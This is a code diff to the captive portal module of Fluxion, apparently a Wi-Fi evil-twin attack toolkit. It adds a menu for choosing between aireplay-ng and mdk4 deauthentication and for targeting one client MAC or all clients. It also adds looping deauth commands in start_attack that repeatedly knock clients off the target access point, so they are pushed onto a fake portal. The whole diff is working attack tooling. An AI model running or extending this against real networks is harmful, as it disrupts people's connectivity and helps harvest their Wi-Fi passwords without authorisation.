@@ -23,6 +23,81 @@ CaptivePortalGatewayNetwork=${CaptivePortalGatewayAddress%.*}
 # ============================================================ #
 # ============== < Captive Portal Subroutines > ============== #
 # ============================================================ #
+
+captive_portal_unset_deauthenticator_filter() {
+  if [ ! "$CaptivePortalDeauthenticatorFilter" ]; then return 1; fi
+  CaptivePortalDeauthenticatorFilter=""
+}
+
+captive_portal_set_deauthenticator_filter() {
+  if [ "$CaptivePortalDeauthenticatorFilter" ]; then return 0; fi
+
+  case "$CaptivePortalDeauthenticatorIdentifier" in
+    "$CaptivePortalDeauthenticatorAireplayMethodOption")
+      # continue
+      ;;
+    "$CaptivePortalDeauthenticatorMdk4MethodOption")
+      return 0
+      ;;
+  esac
+
+  captive_portal_unset_deauthenticator_filter
+
+  local choices=(
+    "$FLUXIONAttackDeauthAllClients"
+    "$FLUXIONAttackDeauthSpecificClient"
+    "$FLUXIONGeneralBackOption"
+  )
+
+  io_query_choice "Note:
+
+    For deauthenticate all clients is better to use ${CYel}mdk4${CClr} option.
+    Get back and choose ${CYel}mdk4${CClr} if you need this." choices[@]
+
+  case "$IOQueryChoice" in
+    "$FLUXIONAttackDeauthAllClients")
+      CaptivePortalDeauthenticatorFilter="None"
+      ;;
+    "$FLUXIONAttackDeauthSpecificClient")
+      echo
+      echo -n "$FLUXIONAttackDeauthEnterMacAddress: "
+      read CaptivePortalDeauthenticatorFilter
+      ;;
+    "$FLUXIONGeneralBackOption")
+      captive_portal_unset_deauthenticator_filter
+      return 1
+      ;;
+  esac
+}
+
+captive_portal_unset_deauthenticator_identifier() {
+  if [ ! "$CaptivePortalDeauthenticatorIdentifier" ]; then return 1; fi
+  CaptivePortalDeauthenticatorIdentifier=""
+}
+
+captive_portal_set_deauthenticator_identifier() {
+  if [ "$CaptivePortalDeauthenticatorIdentifier" ]; then return 0; fi
+
+  captive_portal_unset_deauthenticator_identifier
+
+  local methods=(
+    "$CaptivePortalDeauthenticatorAireplayMethodOption"
+    "$CaptivePortalDeauthenticatorMdk4MethodOption"
+    "$FLUXIONGeneralBackOption"
+  )
+  io_query_choice "$CaptivePortalDeauthenticatorMessage" methods[@]
+
+  CaptivePortalDeauthenticatorIdentifier="$IOQueryChoice"
+
+  echo
+
+  if [ "$CaptivePortalDeauthenticatorIdentifier" = \
+    "$FLUXIONGeneralBackOption" ]; then
+    captive_portal_unset_deauthenticator_identifier
+    return 1
+  fi
+}
+
 captive_portal_unset_jammer_interface() {
   CaptivePortalJammerInterfaceOriginal=""
 
@@ -1311,6 +1386,8 @@ unprep_attack() {
   captive_portal_unset_authenticator
   captive_portal_unset_ap_interface
   captive_portal_unset_jammer_interface
+  captive_portal_unset_deauthenticator_identifier
+  captive_portal_unset_deauthenticator_filter
 }
 
 prep_attack() {
@@ -1323,6 +1400,8 @@ prep_attack() {
     "set_connectivity"
     "set_user_interface"
     "set_attack"
+    "set_deauthenticator_identifier"
+    "set_deauthenticator_filter"
   )
 
   if ! fluxion_do_sequence captive_portal sequence[@]; then
@@ -1360,6 +1439,10 @@ load_attack() {
     "$targetHashMAC" != "$FluxionTargetMAC" ]; then
     CaptivePortalHashPath=""
   fi
+
+  # Deauthenticator settings
+  CaptivePortalDeauthenticatorIdentifier=${configuration[10]}
+  CaptivePortalDeauthenticatorFilter=${configuration[11]}
 }
 
 save_attack() {
@@ -1381,6 +1464,10 @@ save_attack() {
   # Target to verify validity of hash on restore.
   echo "$FluxionTargetSSID" >> "$configurationPath"
   echo "$FluxionTargetMAC" >> "$configurationPath"
+
+  # Deauthenticator settings
+  echo "$CaptivePortalDeauthenticatorIdentifier" >> "$configurationPath"
+  echo "$CaptivePortalDeauthenticatorFilter" >> "$configurationPath"
 }
 
 stop_attack() {
@@ -1494,18 +1581,49 @@ start_attack() {
   echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk4_blacklist.lst"
 
   if [ $FLUXIONEnable5GHZ -eq 1 ]; then
+
+    # TODO: make whitelist filtering for 5GHz networks
     xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" &
     # Save parent's pid, to get to child later.
     CaptivePortalJammerServiceXtermPID=$!
+
   else
 
-	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
-        # Save parent's pid, to get to child later.
-    	CaptivePortalJammerServiceXtermPID=$!
+    # Switch the wifi card on target channel.
+    # Use airodump-ng and kill because aireplay-ng doesn't have an option to indicate the AP channel.
+    airodump-ng -c $FluxionTargetChannel $CaptivePortalJammerInterface &>/dev/null &
+    kill -SIGINT $!
+
+    # Prepare deauthenticators
+    case "$CaptivePortalDeauthenticatorIdentifier" in
+      "$CaptivePortalDeauthenticatorMdk4MethodOption")
+        echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk4_blacklist.lst ;;
+    esac
+
+    # Start deauthenticators.
+    case "$CaptivePortalDeauthenticatorIdentifier" in
+      "$CaptivePortalDeauthenticatorAireplayMethodOption")
+        if [ "$CaptivePortalDeauthenticatorFilter" = "None" ]; then
+          xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+            -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+            "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface; done" &
+          CaptivePortalJammerServiceXtermPID=$!
+        else
+          xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+            -title "Deauthenticating specified client on $FluxionTargetSSID" -e \
+            "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC -c $CaptivePortalDeauthenticatorFilter --ignore-negative-one $CaptivePortalJammerInterface; done" &
+          CaptivePortalJammerServiceXtermPID=$!
+        fi
+        ;;
+      "$CaptivePortalDeauthenticatorMdk4MethodOption")
+        xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+          -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+          "mdk4 $CaptivePortalJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel" &
+        CaptivePortalJammerServiceXtermPID=$!
+        ;;
+    esac
 
   fi
 
